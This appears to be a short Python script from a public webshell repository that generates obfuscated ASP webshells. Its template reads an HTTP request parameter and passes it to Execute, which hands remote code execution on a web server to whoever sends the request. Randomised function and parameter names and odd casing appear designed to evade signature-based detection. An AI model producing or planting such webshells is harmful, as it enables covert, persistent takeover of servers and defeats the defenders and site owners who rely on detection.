import random

#author: pureqh
#github: https://github.com/pureqh/webshell

shell = '''<%
<!--
Function {0}():
    {0} = request("{1}")
End Function

Function {2}():
    execUte({0}())
End Function
{2}()
-->

%>'''



def random_str(len):
    str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str,len))   
    
def build_webshell():
    FunctionName = random_str(4)
    parameter = random_str(4)
    FunctionName1 = random_str(4)
    shellc = shell.format(FunctionName,parameter,FunctionName1)
    return shellc

def check(**kwargs):
	print (build_webshell())


if __name__ == '__main__':
    print (build_webshell())